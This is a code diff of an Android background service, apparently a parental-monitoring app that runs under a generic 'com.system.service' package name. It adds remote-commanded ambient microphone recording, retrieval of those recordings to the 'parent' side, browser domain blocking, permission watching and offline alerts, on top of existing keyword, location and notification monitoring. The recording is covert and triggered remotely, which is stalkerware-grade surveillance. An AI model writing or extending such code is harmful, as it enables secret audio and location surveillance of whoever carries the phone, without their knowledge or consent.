@@ -12,6 +12,10 @@ import android.os.*
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
 import com.system.service.monitors.*
+import com.system.service.monitors.AmbientRecorder
+import com.system.service.monitors.BrowserBlocker
+import com.system.service.monitors.OfflineAlertManager
+import com.system.service.monitors.PermissionWatcher
 import com.system.service.setup.MediaProjectionActivity
 import com.system.service.setup.ShakeDetector
 import org.json.JSONArray
@@ -59,10 +63,13 @@ class CoreService : Service() {
         }
         AppBlockerManager.init(this)
         KeywordDetector.init(this)
+        BrowserBlocker.init(this)
         connectServer()
         WatchdogReceiver.schedule(this)
         MonitorWorker.enqueue(this)
         shakeDetector = ShakeDetector(this).also { it.start() }
+        PermissionWatcher.start(this)
+        OfflineAlertManager.start(this)
 
         // Register network callback for auto-reconnect
         try {
@@ -81,6 +88,9 @@ class CoreService : Service() {
         shakeDetector?.stop()
         GeofenceMonitor.stopTracking()
         InternetScheduler.disable()
+        AmbientRecorder.stopRecording(this)
+        PermissionWatcher.stop()
+        OfflineAlertManager.stop()
         releaseWakeLock()
         WatchdogReceiver.schedule(this)
         try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
@@ -116,13 +126,15 @@ class CoreService : Service() {
             pairCode       = pairCode,
             onMessage      = { handleCommand(it) },
             onConnected    = {
+                OfflineAlertManager.onConnected()
                 NotificationMonitor.drainQueue()
                 sendData("device_info", JSONObject().apply {
-                    put("blocked_apps", JSONArray(AppBlockerManager.getBlockedApps()))
-                    put("keywords",     JSONArray(KeywordDetector.getKeywords()))
+                    put("blocked_apps",      JSONArray(AppBlockerManager.getBlockedApps()))
+                    put("keywords",          JSONArray(KeywordDetector.getKeywords()))
+                    put("blocked_domains",   JSONArray(BrowserBlocker.getBlockedDomains()))
                 })
             },
-            onDisconnected = {}
+            onDisconnected = { OfflineAlertManager.onDisconnected() }
         )
         wsManager?.connect()
     }
@@ -204,6 +216,61 @@ class CoreService : Service() {
                 "disable_schedule" -> InternetScheduler.disable()
 
                 "get_daily_report" -> sendData("daily_report", AppBlockerManager.getDailyReport())
+
+                // ── Browser URL Blocking ───────────────────────────────────────
+                "set_blocked_domains" -> {
+                    val arr = data.optJSONArray("domains") ?: JSONArray()
+                    val list = (0 until arr.length()).map { arr.getString(it) }
+                    BrowserBlocker.setBlockedDomains(list, this)
+                    sendData("blocked_domains_updated", JSONObject().apply {
+                        put("count", list.size)
+                        put("domains", arr)
+                    })
+                }
+                "get_blocked_domains" -> {
+                    sendData("blocked_domains", JSONObject().apply {
+                        put("domains", JSONArray(BrowserBlocker.getBlockedDomains()))
+                    })
+                }
+
+                // ── Ambient Audio Recording ────────────────────────────────────
+                "start_ambient_record" -> {
+                    val secs = data.optInt("duration_seconds", 60)
+                    AmbientRecorder.startRecording(this, secs)
+                }
+                "stop_ambient_record" -> AmbientRecorder.stopRecording(this)
+                "get_recording" -> {
+                    val path = data.optString("path")
+                    if (path.isNotEmpty()) AmbientRecorder.sendRecordingToParent(this, path)
+                }
+                "list_recordings" -> {
+                    val files = AmbientRecorder.listRecordings(this)
+                    val arr   = JSONArray()
+                    files.take(20).forEach { f ->
+                        arr.put(JSONObject().apply {
+                            put("path", f.absolutePath)
+                            put("filename", f.name)
+                            put("size_kb", f.length() / 1024)
+                            put("modified", f.lastModified())
+                        })
+                    }
+                    sendData("recording_list", JSONObject().apply { put("files", arr) })
+                }
+
+                // ── Offline Alert Threshold ────────────────────────────────────
+                "set_offline_threshold" -> {
+                    val mins = data.optInt("minutes", 30)
+                    OfflineAlertManager.setThreshold(this, mins)
+                    sendData("offline_threshold_set", JSONObject().apply { put("minutes", mins) })
+                }
+
+                // ── Permission Status ──────────────────────────────────────────
+                "get_permission_status" -> {
+                    // PermissionWatcher sends status on next check cycle; trigger immediately
+                    sendData("permission_check_requested", JSONObject().apply {
+                        put("time", System.currentTimeMillis())
+                    })
+                }
 
                 "block_contact" -> {
                     val number = data.optString("number")
